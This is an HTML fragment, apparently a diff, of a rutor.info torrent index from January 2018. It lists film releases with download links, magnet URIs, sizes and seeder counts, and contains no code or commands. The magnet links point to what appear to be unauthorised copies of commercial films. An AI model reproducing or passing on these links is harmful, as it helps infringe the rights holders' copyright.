+<td align="right">34.65&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;54</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;20</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606865"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:49a1148acdf7e72688b15eec1125066ad3d2957d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606865/udacha-logana_logan-lucky-2017-bdremux-1080p-d-a-itunes">Удача Логана / Logan Lucky (2017) BDRemux 1080p | D, A | iTunes </a></td> 
+<td align="right">31.51&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;18</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;8</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606856"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:57cd60b29e690cb3b986e1151f40a9ee96e6fb09&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606856/shest-nedel_six-weeks-1982-web-dlrip-720p-p">Шесть недель / Six weeks (1982) WEB-DLRip 720p | P </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">5.33&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606826"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:96f758b78ffbb5e82eac289eaebe50be9e78b542&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606826/miks-kebab_mixed-kebab-2012-dvdrip-l1">Микс кебаб / Mixed Kebab (2012) DVDRip | L1 </a></td> 
+<td align="right">701.62&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606848"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cb4d964c6f74a443697c987007bb08eca28c9bda&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606848/rokko-i-ego-bratja_rocco-e-i-suoi-fratelli-1960-hdrip-avc-ot-kaztorrents-p">Рокко и его братья / Rocco e i suoi fratelli (1960) HDRip-AVC от Kaztorrents | P </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.16&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606842"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:84fecfaffa51f62eafc12d8d6d5ad2798348a501&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606842/vozmutitel-spokojstvija_borgman-2013-hdrip-avc-ot-kaztorrents-p">Возмутитель спокойствия / Borgman (2013) HDRip-AVC от Kaztorrents | P </a></td> 
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606839"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:dfb60e4674f97aba0e421d73e00ec639574b1c32&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606839/farforovaja-luna_china-moon-1991-hdrip-avc-ot-kaztorrents-p2">Фарфоровая луна / China Moon (1991) HDRip-AVC от Kaztorrents | P2 </a></td> 
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606833"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0f6e6d8dbd93c7afb856fb65fc6bd58b5caacb83&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606833/obratnyj-otschjot-perezapusk_reset_zhi-ming-dao-shu-2017-webrip-1080p-l">Обратный отсчёт: Перезапуск / Reset / Zhi ming dao shu (2017) WEBRip 1080p | L </a></td> <td align="right">15<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.59&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;368</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;15</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606831"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:49b02fbb926d25f030ee799f05870cfa8dce11de&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606831/robot-i-frjenk_robot-frank-2012-hdrip-avc-ot-exkinoray-p">Робот и Фрэнк / Robot &amp; Frank (2012) HDRip-AVC от ExKinoRay | P </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">746.13&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;19</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606827"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7c3f2cb9d32955ea9474b69bf0c740f73d6e9434&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606827/igry-djavola_before-the-devil-knows-youre-dead-2007-bdrip-720p-ot-nnnb-d-a">Игры дьявола / Before the Devil Knows You&#039;re Dead (2007) BDRip 720p от NNNB | D, A </a></td> 
+<td align="right">5.75&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606825"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:af97ddbc242f38e055e538f07d49edb4601821da&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606825/zaterjannyj-gorod-z_the-lost-city-of-z-2016-bdrip-avc-ot-new-team-licenzija">Затерянный город Z / The Lost City of Z (2016) BDRip-AVC от New-Team | Лицензия </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">754.48&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;35</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606824"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cfc0c91182541b47bea39acbef7168290e2082a9&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606824/ono_it-2017-bdrip-avc-ot-hellywood-licenzija">Оно / It (2017) BDRip-AVC от HELLYWOOD | Лицензия </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;128</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;18</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606822"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5aabf9c049057144d3900762f0e82772987a684e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606822/zaterjannyj-gorod-z_the-lost-city-of-z-2016-bdrip-avc-ot-new-team-licenzija">Затерянный город Z / The Lost City of Z (2016) BDRip-AVC от New-Team | Лицензия </a></td> 
+<td align="right">2.87&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;33</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606821"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6bc5193aabb74fa962eb00f36a8e04a87a007625&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606821/chetvero-protiv-banka_vier-gegen-die-bank-2016-bdrip-720p-itunes">Четверо против банка / Vier gegen die Bank (2016) BDRip 720p | iTunes </a></td> <td align="right">6<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">4.88&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;561</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;16</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606820"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fe0005c4b55cc6ed2af076d49e8acfe6c41eeb2d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606820/drugaja-storona-polunochi_po-tu-storonu-polunochi_the-other-side-of-midnight-1977-hdtv-1080i-p">Другая сторона полуночи / По ту сторону полуночи / The Other Side of Midnight (1977) HDTV 1080i | P </a></td> 
+<td align="right">7.08&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;9</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606806"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:090f05a47677628f6143b3e9addabe3e07d7f55c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606806/dikie-ulicy_savage-streets-1984-bdrip-720p-a">Дикие улицы / Savage Streets (1984) BDRip 720p | A </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">6.37&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;4</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606817"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b629f51de7a0f9b91538a5d1ef71cd9b40d03b25&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606817/zaterjannyj-gorod-z_the-lost-city-of-z-2016-bdrip-avc-ot-new-team-licenzija">Затерянный город Z / The Lost City of Z (2016) BDRip-AVC от New-Team | Лицензия </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.50&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;44</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606815"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3499c8f2e98af7b870799364a01dd2e7fc4c8445&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606815/van-gog-s-ljubovju-vinsent_loving-vincent-2017-bdrip-1080p-itunes">Ван Гог. С любовью, Винсент / Loving Vincent (2017) BDRip 1080p | iTunes </a></td> <td align="right">9<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">8.20&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;339</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;24</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606807"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bb4a48aabcf43c32ecf4f50cf32436ac1bc9eba1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606807/associacija_the-association_yan-ku-shen-tan-1974-dvd5-custom-l1">Ассоциация / The Association / Yan ku shen tan (1974) DVD5 | Custom | L1 </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">3.36&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603238"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c1162392cfa9334f290bbdc5df87820cdf2af52a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603238/ono_it-2017-bdrip-1080p-ot-qqss44-megapeer-licenzija">Оно / It (2017) BDRip 1080p от qqss44 &amp; MegaPeer | Лицензия </a></td> <td align="right">32<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.57&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;230</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;27</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606793"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:45098a5edb822fb3d4949f58894e52dcf329c694&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606793/dikie-ulicy_savage-streets-1984-bdrip-avc-a">Дикие улицы / Savage Streets (1984) BDRip-AVC | A </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.73&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606798"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b0d6a95fa244484fd5689204a5589d0650c82d2a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606798/ohotnik_the-hunter-1980-hdtvrip-720p-p2-a">Охотник / The Hunter (1980) HDTVRip 720p | P2, A </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">4.36&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606789"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0a9f925418ca3bcca51fd4e4cbe6f40ef5b933a7&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606789/ono_it-2017-bdremux-1080p-d-l-a-licenzija">Оно / It (2017) BDRemux 1080p | D, L, A | Лицензия </a></td> 
+<td align="right">34.04&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;22</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;9</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/565276"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3acc8ded623ad43834add9c65a5e73f599073ed1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/565276/obratnaja-tjaga_backdraft-1991-bdrip-720p-ot-k.e.n-nnmclub-p-p2-a">Обратная тяга / Backdraft (1991) BDRip 720p от k.e.n &amp; NNMClub | P, P2, A </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">6.28&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;15</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603228"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:38faaaeb60cd68347131f808c325e285be428632&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603228/ono_it-2017-bdrip-avc-ot-exkinoray-licenzija">Оно / It (2017) BDRip-AVC от ExKinoRay | Лицензия </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">744.52&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;31</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606778"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:06d7be76174e32b8fc9753ac18ba37900b00a4da&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606778/poslanniki_the-messengers-2007-bdrip-720p-ot-kinogadget-ipad-d">Посланники / The Messengers (2007) BDRip 720p от KinoGadget | iPad | D </a></td> 
+<td align="right">2.17&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;9</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606770"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2cea4b31e12ec4e323dd32f20a1748f39a36f463&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606770/tri-bilborda-na-granice-jebbinga-missuri_three-billboards-outside-ebbing-missouri-2017-dvdscr-sub">Три билборда на границе Эббинга, Миссури / Three Billboards Outside Ebbing, Missouri (2017) DVDScr | Sub </a></td> <td align="right">23<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.41&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;494</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;12</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606777"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6de1e18ba06ab3cae155b11841b36d639a43c882&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606777/ono_it-2017-blu-ray-eur-1080p-licenzija">Оно / It (2017) Blu-ray EUR 1080p | Лицензия </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">40.33&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;27</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;20</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606772"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:032162e0939d325213e88e209d4e266a0c733583&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606772/svet-vokrug_everything-is-illuminated-2005-web-dl-1080p-p2-p">Свет вокруг / Everything Is Illuminated (2005) WEB-DL 1080p | P2, P </a></td> 
+<td align="right">8.33&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606769"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:050d03ff514e68e12208156cbf38ed0cd3e0e198&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606769/ono_it-2017-bdrip-ot-generalfilm-licenzija">Оно / It (2017) BDRip от GeneralFilm | Лицензия </a></td> 
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;91</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;10</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/603213"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5c1bf72b434914c41507635d982d767f6ee6bbf0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603213/ono_it-2017-bdrip-ot-megapeer-licenzija">Оно / It (2017) BDRip от MegaPeer | Лицензия </a></td> 
+<td align="right">798.81&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;19</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/603165"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:65a9086b5703f4d06846cb156e056bcb7beb47b6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603165/ono_it-2017-bdrip-ot-megapeer-licenzija">Оно / It (2017) BDRip от MegaPeer | Лицензия </a></td> 
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;38</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603164"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e5f69c474aef55fce87c7a92568b83bac6a2ec11&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603164/ono_it-2017-bdrip-ot-megapeer-licenzija">Оно / It (2017) BDRip от MegaPeer | Лицензия </a></td> <td align="right">22<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;336</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;61</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606763"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e19e8901790beaa5014066873b260acf73c19e6d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606763/chetvero-protiv-banka_vier-gegen-die-bank-2016-hdrip-ot-generalfilm-kpk-itunes">Четверо против банка / Vier gegen die Bank (2016) HDRip от Generalfilm | КПК | iTunes </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">364.42&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;68</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603249"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:df80bd5381fde4989b196672ece4efc465ecdd5f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603249/ono_it-2017-bdrip-ot-exkinoray-licenzija">Оно / It (2017) BDRip от ExKinoRay | Лицензия </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;35</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;10</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606758"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c64b3e580177f6d55b4796d6ffa96659dbb7ce66&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606758/otrjady-smerti-shaolinja_shaolin-death-squares_shao-lin-xiao-zi-1977-dvd5-a">Отряды смерти Шаолиня / Shaolin death squares / Shao Lin xiao zi (1977) DVD5 | A </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
